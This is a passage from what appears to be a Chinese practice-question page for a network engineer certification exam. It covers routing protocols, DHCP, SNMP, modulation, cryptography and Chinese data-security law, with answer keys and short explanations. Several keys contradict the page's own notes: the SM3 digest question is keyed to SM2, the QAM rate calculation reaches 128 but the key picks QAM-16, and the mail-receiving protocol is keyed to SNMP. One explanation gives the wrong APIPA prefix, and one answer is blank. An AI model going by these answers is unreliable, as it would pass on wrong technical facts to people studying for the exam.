alt="三类"></p><p>三类</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513215146691.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列FAT AP无线组网的说法中错误的是（）。</li></ol><p>A.组网成本较低<br>B.FAT AP可以为无线接入终端提供DHCP服务<br>C.FAT AP可以为无线接入终端提供跨AP的L3漫游<br>D.适合家庭或者小规模网络应用场景</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在交换机上执行undo mac-address blackhole命令，其作用是（）。</li></ol><p>A.删除配置的黑洞MAC地址表项<br>B.为用户接口配置了端口安全<br>C.静止用户接口透传VLAN<br>D.关闭接口的MAC的学习功能</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在某台主机上无线访问域名为ww.aa.cn的网站，而局域网中的其他主机可正常访问，在改主机上执行ping命令时有如下所示的信息：</li></ol><p>A.该主机IP地址配置错误<br>B.该主机网关配置错误<br>C.该主机的连接请求被拦截<br>D.该主机DNS服务器配置错误</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513215605890.png" alt="img"></p><blockquote><p>答: C</p></blockquote><ul><li><ol><li>下列关于telnet描述错误的是（）。</li></ol><p>A.telenet服务的默认端口是23<br>B.访问呢远端设备时，本地防火墙入站规则要允许telnet访问 (出站)<br>C.必须指导远程主机的IP或者域名<br>D.本地计算机要有telnet客户端程序</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下面所示的网络中，所有路由器的接口均运行OSPF协议，则整个网络中选举（）个DR。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512144657372.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.<span class="hljs-number">4</span><span class="hljs-selector-tag">B</span>.<span class="hljs-number">2</span>C.<span class="hljs-number">3</span>D.<span class="hljs-number">1</span>复制代码</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513215755618.png" alt="img"></p><blockquote><p>答：4， 因为是4个网段</p></blockquote><ul><li><ol><li>当DHCP服务器接收到客户端的DHCP Discover报文后，使用（）报文对其进行回应。</li></ol><p>A.DHCPOffer<br>B.DHCPAck<br>C.DHCPNak<br>D.DHCPRequest</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513215938363.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>某主机从DHCP服务器上自动获取的IP地址是169.254.220.167，可能原因是（）。</li></ol><p>A.区域内有多台DHCP服务器<br>B.DHCP服务器分配的保留IP地址<br>C.该网络内的DHCP服务器不工作<br>D.DHCP服务器地址设置错误</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513220234913.png" alt="img"></p><blockquote><p>答：C</p></blockquote><blockquote><p>解析：192.254.X.X&#x2F;24 是APIPA，自动分配的IP地址，由操作系统自动分配的IP地址。</p></blockquote><ul><li><ol><li>根据CSMA&#x2F;CD协议，假设一个以太网局域网的往返时延为100毫秒，传播速度为200米&#x2F;微妙。如果发生了数据碰撞，设备发送的数据需要在最长不超过（）时间内检测到碰撞。</li></ol><p>A.150微秒<br>B.50微秒<br>C.200微秒<br>D.100微秒</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513220327265.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513220450110.png" alt="img"></p><blockquote><p>答：D</p></blockquote><blockquote><p>解析：需要在发送数据帧之前检查到碰撞，最小帧长度，最长碰撞时间；往返时延&#x3D;2倍传播时延。</p></blockquote><ul><li><ol><li>DNS是目前互联网上最常见的流量调度方式，其本质是使用（）资源记录实现的。</li></ol><p>A.A<br>B.CNAME<br>C.AAAA<br>D.PTR</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513221145223.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>网络管理工作站通过SNMP协议管理网络设备，当被管理设备发生故障时，网络管理工作站将会收到（）报文。</li></ol><p>A.set-request报文<br>B.trap报文<br>C.get-request报文<br>D.get-response报文</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513221249221.png" alt="img"></p><blockquote><p>答：B, trap是162端口，其他报文都是161端口</p></blockquote><ul><li><ol><li>SNMP协议中，用于向管理站发送紧急告警消息的是（）。</li></ol><p>A.TARP<br>B.GET-RESPONSE<br>C.GET-REQUEST<br>D.INFORM</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在双绞线中STP和UTP分别代表（）。</li></ol><p>A.非屏蔽双绞线和屏蔽双绞线<br>B.铠装线缆和非铠装线缆 (埋在地下，防止挤压上，用于强电)<br>C.屏蔽双绞线和非屏蔽双绞线<br>D.3类线和5类线</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513221403833.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513221429410.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>常用光功率的单位为（）。</li></ol><p>A.mw<br>B.dbm （分贝）<br>C.db<br>D.dbu</p></li></ul><blockquote><p>答：B，测量光纤的光衰</p></blockquote><ul><li><ol><li>在RIP路由协议中，当路由跳数达到（）时，目的地标记为路由不可达。</li></ol><p>A.16<br>B.14<br>C.15<br>D.13</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>RIP协议在更新和维护路由时，如果设备老化时间内没有收到邻居发来的路由更新报文，则认为路由不可达，使用的是（）定时器。</li></ol><p>A.Garbage-collect timer (垃圾超时定时器，120,240)<br>B.Suppress timer<br>C.Age timer （180s）<br>D.Update timer (30s, 25~35s)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513221859067.png" alt="img"></p><blockquote><p>答：1</p></blockquote><ul><li><ol><li>（）不属于数据链路层的功能。</li></ol><p>A.路由选择<br>B.帧同步<br>C.差错检测<br>D.建立连接</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>电子邮件所使用的SMTP协议的默认端口为（）。</li></ol><p>A.21<br>B.25<br>C.53<br>D.23</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513222115718.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513222134584.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>当一个TCP连接的拥塞窗口为4000字节，每个往返时间为0.2秒，丢包率为0.05时，该连接的快恢复拥塞窗口新值是（）。</li></ol><p>A.2000字节<br>B.1800字节<br>C.2100字节<br>D.1900字节</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513222218754.png" alt="img"></p><blockquote><p>答：A</p></blockquote><blockquote><p>解析：先指数级增加，再线性增加</p></blockquote><ul><li><ol><li>在交换机上执行display stp topology-change命令，其作用是（）。</li></ol><p>A.查看端口TC&#x2F;TCN报文收发计数 （STP的3中包，TC&#x2F;TCA&#x2F;TCN）display stp tc-bpdu statistics<br>B.查看桥的生成树状态详细信息 display stp bridege<br>C.查看运行生成树协议的异常端口信息 display stp abnormal-interface<br>D.查看MSTP拓扑变化变化相关的统计信息</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>这16-QAM调制可以传输每个符号（）个比特。</li></ol><p>A.4<br>B.2<br>C.16<br>D.8</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513222608364.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513222623631.png" alt="img"></p><blockquote><p>答：A log2^X</p></blockquote><ul><li><ol><li>下列网络冗余设计的说法中正确的是（）。</li></ol><p>A.网络冗余设计中主备切换应由网络管理员手动切换，并尽量缩短切换时间<br>B.备用路径冗余方案可以有效提高网络的性能 （不使用）<br>C.VRRP网络冗余方案中，主备链路可以实现多链路流量负载分担 (可靠性)<br>D.网络虚拟化可以实现网络冗余</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下调制中，调制效率最高的是（）。</li></ol><p>A.16-QAM(16-Quadrature Amplitude Modulation)<br>B.BPSK(Binary Phase Shift Keying) （2进制）<br>C.QPSK(Quardrature Phase Shift Keying) （4进制）<br>D.64-QAM(64-Quadrature Amplitude Modulation)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513222928638.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列WEP无线加密技术的说法中错误的是（）。</li></ol><p>A.WEP密钥的最长为128位<br>B.WEP使用RC6加密算法<br>C.WEP密钥由初始向量（IV,随机数）+用户指定字符串+校验值组成 (没有校验值)<br>D.WEP的初始向量在特定情况下可能会出现重复值</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513223058959.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列能够有效减少SQL注入攻击对Web应用威胁的操作的是（）。</li></ol><p>A.对数据库进行加密<br>B.定期备份数据库<br>C.启用WAF(Web 应用程序防火墙)<br>D.将数据库和Web服务器分离部署</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513223252668.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>国密SSL数字证书所采用的签名算法是（）。</li></ol><p>A.RSA<br>B.ECC<br>C.SM3<br>D.SM3WithSM2</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513223453677.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513223551190.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列关于网络安全等级保护的说法中错误的是（）。</li></ol><p>A.信息系统定级时需要明确定级备案的责任部门和责任人<br>B.信息系统在规划设计阶段就需要定级<br>C.二级以上（含二级）信息系统定级后需要到公安机关备案<br>D.一级至五级信息系统定级时需要安全专家对定级结果进行论证和审定 (2级及以上才需要)</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>某园区的用户无法访问202.145.12.35，在Windows平台下，可以使用（）命令判断故障是否在园区网内部。</li></ol><p>A.netstat 202.145.12.35<br>B.arp 202.145.12.35<br>C.ping 202。145.12.35<br>D.tracert 202.145.12.35</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>56.57. 对IPv4地址段192.168.10.0&#x2F;24进行子网划分，要求每个子网至少50个可用IP地址，其主机位数最少需要（）位，（）属于所划分子网的网络号。</p><p>A.7<br>B.5<br>C.8<br>D.6<br>A.192.168.10.32<br>B.192.168.10.0<br>C.192.168.10.160<br>D.192.168.10.96</p></li></ul><blockquote><p>答：D,B</p></blockquote><ul><li><p>58.59. 网络地址范围172.24.0.0~172.24.7.0可以聚合为（），聚合后的网络中有（）个可用主机地址。</p><p>A.172.24.0.0&#x2F;21<br>B.172.24.0.0.24<br>C.172.24.0.0&#x2F;20<br>D.172.24.0.0&#x2F;16<br>A.2048<br>B.2456<br>C.2032<br>D.2046</p></li></ul><blockquote><p>答：A,D</p></blockquote><ul><li><p>60.STP协议中（）机制用于决定每个网段上的Designated Port。</p><p>A.Root Path Cost 根路径成本<br>B.Port Priority 端口优先级<br>C.Root Bridge ID识根桥标识<br>D.Bridge Priority桥优先级</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513224311519.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在BGP协议中，路由策略过程的最后一个步骤是（）。</li></ol><p>A.路由属性修改<br>B.路由策略应用<br>C.路由信息发布<br>D.路由属性筛选</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513224524934.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列光纤接入网络中，没有采用时间分隔多路访问（TDMA）来实现下行和上行信号传输的技术是（）。</li></ol><p>A.GPON千兆无源光纤网络<br>B.EPON以太网无源光纤网络<br>C.XG-PON10G无源光纤网络<br>D.WDM-PON波分复用无源光纤网络</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513224623508.png" alt="img"></p><blockquote><p>答：D</p></blockquote><blockquote><p>解析：上行1290-1330nm,下行 1480-1500nm; A&#x2F;G&#x2F;E&#x2F;PON都是</p></blockquote><ul><li><ol><li>在Windows系统中，DNS所使用的端口号是（）。</li></ol><p>A.25<br>B.65<br>C.35<br>D.53</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513224853713.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513224908247.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li>64.65. 某网络图片如下图所示，局域网用户通过防火墙访问互联网，在防火墙上配置安全策略实现其功能时源地址应为（）、目的安全域应为（）、动作为Permit。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513224930839.png" alt="img"></p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>.<span class="hljs-number">113.200.2.1</span>/<span class="hljs-number">28</span>B.<span class="hljs-number">10.0.1.1</span>/<span class="hljs-number">25</span>C.<span class="hljs-number">10.0.1.1</span>/<span class="hljs-number">24</span>D.<span class="hljs-number">10.0.1.129</span>/<span class="hljs-number">25</span><span class="hljs-keyword">A</span>.localB.untrustC.trustD.dmz复制代码</code></pre><blockquote><p>答：C,B</p></blockquote><ul><li><ol><li>《中华人民共和国数据安全法》适用于在（）开展数据处理活动及其安全监管。</li></ol><p>A.我国境内及境外<br>B.我国境外<br>C.我国境内<br>D.我国境内的局部地区</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513225100110.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列关于《中华人民共和国个人信息保护法》相关法律条文的描述中，不正确的是（）。</li></ol><p>A.处理个人信息应当遵守合法、正当、必要和诚信原则<br>B.个人一旦同意他人或机构处理个人信息，就无权再反悔<br>C.任何组织、个人不得非法收集、使用、加工、传输他人个人信息<br>D.为公共利益实施新闻报道，可不经个人同意在合理的范围内处理个人信息</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513225137691.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>项目管理的三重约束不包括（）。</li></ol><p>A.项目时间约束<br>B.项目范围约束<br>C.项目收益约束<br>D.项目成本约束</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513225217775.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>关于SNMP下列说法错误的是（）。</li></ol><p>A.它采用轮询机制<br>B.可自定义MIB或者SMI<br>C.代理进程接受信息使用161端口<br>D.基于TCP协议 (UDP，异步)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513225334533.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li></li></ol></li></ul><hr><h2 id="2023年5月"><a href="#2023年5月" class="headerlink" title="2023年5月"></a>2023年5月</h2><ul><li><ol><li>固态硬盘的存储介质是（）。</li></ol><p>A.光盘<br>B.闪存 (Flash, DRAM)<br>C.软盘 (1.44兆)<br>D.磁盘</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>虚拟存储技术把（）有机地结合起来使用，从而得到一个更大容量的“内存”。</li></ol><p>A.内存与外存<br>B.Cache与内存<br>C.寄存器与Cache<br>D.Cache与外存</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514213014690.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列接口协议中，不属于硬盘接口协议的是（）。</li></ol><p>A.IDE<br>B.SATA<br>C.SPI (串行外部接口，是微处理器和外存之间交互的串行总线接口)<br>D.SCSI</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514213411485.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>进程所请求的资源得到满足，可以使进程的状态（）。</li></ol><p>A.运行态变成就绪态<br>B.运行态变成等待态<br>C.就绪态变成运行态<br>D.等待态变为就绪态</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514213507994.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列操作系统中，不属于国产系统的是（）。</li></ol><p>A.CentOS<br>B.Deepin<br>C.NeoKylin （中标麒麟）<br>D.HarmonyOS （华为鸿蒙）</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>采用多道程序设计可以有效地提高CPU、内存和IO设备的（）。</li></ol><p>A.灵活性<br>B.可靠性<br>C.兼容性<br>D.利用率</p></li></ul><blockquote><p>答：D， DOS是单道的，多道是多线程的意思。</p></blockquote><ul><li><ol><li>在网络工程师的生命周期中，对用户需求进行了解和分析是在（）阶段。</li></ol><p>A.需求分析<br>B.设计<br>C.实施<br>D.运维</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514213824114.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列工具软件中，不是网络运维常用工具的是（）。</li></ol><p>A.SecureCRT<br>B.WireShark<br>C.Putty<br>D.Eclipse （java开发平台）</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列描述中，不符合《中华人民共和国网络安全法》的是（）。</li></ol><p>A.网络产品应当符合相关国家标准的强制性要求<br>B.网络运营者可根据业务需要自行决定网络日志的留存时间<br>C.网络运营者应当制定网络安全时间应急预案<br>D.网络运营者收集个人信息应遵循正当、必要的原则</p></li></ul><blockquote><p>答：B，21条，按照规定流程日志，不少于6个月</p></blockquote><ul><li><p>10.收到破坏后会对国家安全造成特别严重损害的信息系统，应按照等级保护第（）级的要求进行安全规划。</p><p>A.二 （公共利益造成损害，不维护国家安全）<br>B.三 （公共利益造成严重损害， 危害国家安全）<br>C.四 (公共利益造成特别严重损害， 严重危害国家安全)<br>D.五 （特别严重危害国家安全）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214040155.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列不属于双绞线测试参数的是（）。</li></ol><p>A.近端串扰<br>B.衰减<br>C.丢包率<br>D.等效远端串扰</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214325894.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列不属于光纤跳线的接头类型的是（）。</li></ol><p>A.FC<br>B.SC<br>C.SC<br>D.SEP</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214418674.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>Modem的主要作用是（）。</li></ol><p>A.数模转换<br>B.路由转发<br>C.认证<br>D.地址转换</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214455318.png" alt="img"></p><blockquote><p>答：A，调制解调器，猫</p></blockquote><ul><li><ol><li>百兆以太网采用的数据编码方法是（）。</li></ol><p>A.曼彻斯特<br>B.64B&#x2F;66B (万兆10G)<br>C.8B&#x2F;10B<br>D.45&#x2F;5B</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214540584.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>若采用QAM调制的无噪声理想信道带宽为2MHz，最大数据传输速率为28Mbps，则该信道采用的调制方式（）。</li></ol><p>A.QAM-128<br>B.QAM-64<br>C.QAM-32<br>D.QAM-16</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214629812.png" alt="img"></p><blockquote><p>答：D， R&#x3D;Blog2^N, 4log2^N&#x3D;28, log2^N&#x3D;7, N&#x3D;128</p></blockquote><ul><li><ol><li>在我国商用密码算法体系中，（）属于摘要算法。</li></ol><p>A.SM2 (公钥算法，非对称加密算法)<br>B.SM3 （摘要算法 ）<br>C.SM4 （对称加密算法）<br>D.SM9 （数据签名算法）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214836193.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>使用Traceroute命令时，由中间路由器返回的ICMP超时报文中Type和Code分别是（）。</li></ol><p>A.Type&#x3D;3 Code&#x3D;0<br>B.Type&#x3D;8 Code&#x3D;0<br>C.Type&#x3D;11 Code&#x3D;0<br>D.Type&#x3D;12 Code&#x3D;0</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214944648.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514214959014.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在EPON(Ethernet Passive Optical Network，以太网无源光网络)中，如果用户端的家庭网关或者交换机是运营商提供并统一进行VLAN管理，那么在UNI端口上VLAN操作模式有限配置为（）。</li></ol><p>A.标记模式<br>B.透传模式<br>C.Trunk模式<br>D.Translation模式</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514215103705.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在IEEE标准体系中，WiFi6对应的标准是（）。</li></ol><p>A.802.11ac (Wifi5)<br>B.802.11n<br>C.802.11b<br>D.802.11ax</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514215205236.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在TCP建立连接的三次握手时，假设客户端发送的SYN段中的序列号字段为a，则服务端回复的SYN+ACK段中的确认号为（）。</li></ol><p>A.a<br>B.a+1<br>C.a+20<br>D.随机值</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514215251560.png" alt="img"></p><blockquote><p>答：</p></blockquote><ul><li><ol><li>在OSI参考模型中，负责对应用层消息进行压缩，加密功能的层次为（）。</li></ol><p>A.传输层<br>B.会话层<br>C.表示层<br>D.应用层</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514215329745.png" alt="img"></p><p>0</p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在TCP拥塞控制机制中，快速重传的目的是让主机在计时器超时能够快速恢复，其触发条件是（）。</li></ol><p>A.计时器超时<br>B.拥塞窗口超过阈值<br>C.收到的该报文的ACK<br>D.收到3个冗余ACK</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514215431461.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><p>23.24. 在RIP协议中，默认的最大度量值是（）跳，除了设置最大度量值外，还可以采用（）防止路由环路。</p><p>A.15<br>B.16<br>C.32<br>D.64<br>A.水平分割和垂直翻转<br>B.水平分割和路由毒化<br>C.垂直翻转和路由毒化<br>D.垂直翻转和毒化逆转</p></li></ul><blockquote><p>答：A,B,路由毒化：如果知道该路由不可以，会发给其他路由器；毒化和水平分割是差不多的。</p></blockquote><ul><li><p>25.26. 运行OSPF协议的路由器每（）秒向各个接口发送一次Hello报文，该报文的作用不包括（）。</p><p>A.10<br>B.20<br>C.30<br>D.40<br>A.发现并建立邻居关系<br>B.选举DR&#x2F;BDR<br>C.建立双向通信关系<br>D.同步数据库 (LSA报文)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514215749751.png" alt="img"></p><blockquote><p>答：A,D</p></blockquote><ul><li><ol><li>下列用于AS之间的路由协议是（）。</li></ol><p>A.RIP<br>B.OSPF<br>C.BGP<br>D.ISIS</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>以下关于telnet的叙述中，不正确的是（）。</li></ol><p>A.telnet支持命令模式和会话模式<br>B.telent采用明文传输<br>C.telent默认端口是23<br>D.telnet采用UDP协议</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下关于DHCP服务的说法中，正确的是（）。</li></ol><p>A.DHCP服务器可以远程操作客户端，开启或关闭服务<br>B.在同一个子网中，有且仅能有一个DHCP服务器<br>C.在DHCP服务域内，可以确保工作站使用固定的IP地址<br>D.DHCP客户端需配置正确的服务器地址才能使用DHCP服务 (广播发送dhcp discover报文)</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514220001057.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>WWW的控制协议是（）。</li></ol><p>A.FTP<br>B.HTTP<br>C.SSL<br>D.DNS</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514220103649.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下面用于收取电子邮件的协议是（）。</li></ol><p>A.SMTP （发）<br>B.SNMP （管理网络设备）<br>C.ICMP （传递报文控制信息）<br>D.POP3 （110端口）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>要查询DNS域内的权威域名服务器信息，可查找（）资源记录。</li></ol><p>A.SOA (指名NS记录里那一台才是主服务器)<br>B.NS<br>C.PTR<br>D.A</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514220159213.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514220240682.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>IPv6组播地址的前缀是（）。</li></ol><p>A.FF<br>B.FE<br>C.FD<br>D.FC</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514220449713.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><p>34.35. 在Liinux操作系统中通常使用（）作为Web服务器，其默认的Web站点的目录为（）。</p><p>A.IIS<br>B.Apache<br>C.CFS<br>D.MySQL<br>A.&#x2F;etc&#x2F;httpd<br>B.&#x2F;var&#x2F;log&#x2F;httpd<br>c.&#x2F;etc&#x2F;home<br>D.&#x2F;home&#x2F;httpd</p></li></ul><blockquote><p>答：B,D</p></blockquote><ul><li><ol><li>为了方便运维人员远程维护WindowsServer2008R2服务器，需要在服务器上启用（）服务。</li></ol><p>A.DHCP<br>B.FTP<br>C.DNS<br>D.远程桌面</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>37.38. FTP服务可以开启匿名登录功能，其用户名是（），若要上传文件，应使用（）命令。</p><p>A.root<br>B.user<br>C.guest<br>D.anonymous<br>A.copy<br>B.paste<br>C.put<br>D.get</p></li></ul><blockquote><p>答：D,C</p></blockquote><ul><li><ol><li>邮件客户端使用（）协议同步服务器和客户端之间的邮件列表。</li></ol><p>A.POP3 (收邮件)<br>B.SMTP （发邮件）<br>C.IMAP （和PoP3类似的，只是操作会同步到服务器）<br>D.SSL</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在Windows平台上，命令：arp -d * 作用是（）。</li></ol><p>A.开启ARP学习功能<br>B.添加一条ARP记录 arp -s ip mac<br>C.显示当前ARP记录 arp -a<br>D.删除所有ARP记录</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>41.42. 某网络拓扑如下图所示，边界防火墙的管理地址10.0.122.1，财务服务器地址为10.0.123.2，为禁止外部用户对财务服务器的访问，管理员应在边界防火墙上配（）策略，该条策略配置的源地址为（）。</p><p>A.地址转换<br>B.访问控制<br>C.入侵检测<br>D.VPN<br>A.0.0.0.0<br>B.10.0.122.1<br>C.10.0.123.3<br>D.10.0.123.2</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514220942901.png" alt="img"></p><blockquote><p>答：B,A</p></blockquote><ul><li><p>43~45. PKI体系中，由SSL&#x2F;TLS实现HTTPS应用，浏览器和服务器之间用于加密HTTP 消息的方式是()，如果服务器的证书被撤销，那么所产生的后果是（）。如果此时浏览器继续与该服务器通信，所存在的安全隐患是（）。</p><p>A.对方公钥+公钥加密<br>B.本方公钥+公钥加密<br>C.会话密钥+公钥加密<br>D.会话密钥+对称加密<br>A.服务器不能执行加解密<br>B.服务器不能执行签名<br>C.客户端无法再信任服务器<br>D.客户端无法发送加密消息给服务器<br>A.浏览器发送的消息可能会丢失<br>B.加密消息可能会被第三方解密<br>C.加密的消息可能会被篡改<br>D.客户端身份可能会遭到泄露</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514221151067.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514221309260.png" alt="img"></p><blockquote><p>答：C,C,B</p></blockquote><ul><li><ol><li>在SNMP各项功能中属于网络控制功能的是（）。</li></ol><p>A.性能管理<br>B.计费管理<br>C.配置管理<br>D.故障管理</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250514221725970.png" 